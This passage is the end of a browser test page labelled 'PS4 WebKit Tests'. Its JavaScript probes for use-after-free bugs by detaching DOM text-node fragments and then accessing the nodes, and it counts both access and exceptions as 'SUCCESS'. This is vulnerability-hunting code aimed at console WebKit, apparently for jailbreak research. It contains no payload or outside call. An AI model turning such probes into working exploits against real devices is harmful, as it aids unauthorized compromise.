                log('TEST 19: No FormData corruption', 'FAIL');
                
            } catch(e) {
                log('TEST 19: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test20_TextNodeFragment() {
            log('TEST 20: TextNode Fragment UAF', 'RUNNING');
            try {
                const fragments = [];
                const textNodes = [];
                
                for (let i = 0; i < 40; i++) {
                    const fragment = document.createDocumentFragment();
                    fragments.push(fragment);
                    
                    for (let j = 0; j < 20; j++) {
                        const textNode = document.createTextNode('Text ' + i + '_' + j + ' '.repeat(100));
                        fragment.appendChild(textNode);
                        textNodes.push(textNode);
                    }
                }
                
                const containers = [];
                for (let i = 0; i < 10; i++) {
                    const div = document.createElement('div');
                    div.id = 'container_' + i;
                    document.body.appendChild(div);
                    containers.push(div);
                }
                
                for (let i = 0; i < fragments.length; i++) {
                    const containerIdx = i % containers.length;
                    containers[containerIdx].appendChild(fragments[i]);
                }
                
                for (let i = 0; i < containers.length; i++) {
                    document.body.removeChild(containers[i]);
                }
                
                setTimeout(() => {
                    for (let i = 0; i < textNodes.length; i++) {
                        try {
                            textNodes[i].textContent = 'MODIFIED_AFTER_FREE';
                            const content = textNodes[i].textContent;
                            if (content === 'MODIFIED_AFTER_FREE') {
                                log('TEST 20: TextNode accessible after fragment removal', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                        
                        try {
                            const parent = textNodes[i].parentNode;
                            if (parent !== null) {
                                log('TEST 20: TextNode parent still accessible', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                        
                        try {
                            const range = document.createRange();
                            range.selectNode(textNodes[i]);
                            const extracted = range.extractContents();
                            if (extracted) {
                                log('TEST 20: Range extraction on freed node', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                    
                    log('TEST 20: No TextNode UAF detected', 'FAIL');
                }, 100);
                
            } catch(e) {
                log('TEST 20: Exception - ' + e.message, 'SUCCESS');
            }
        }

        log('PS4 WebKit Tests Loaded - Click buttons to run tests', 'INFO');
    </script>
</body>
</html>
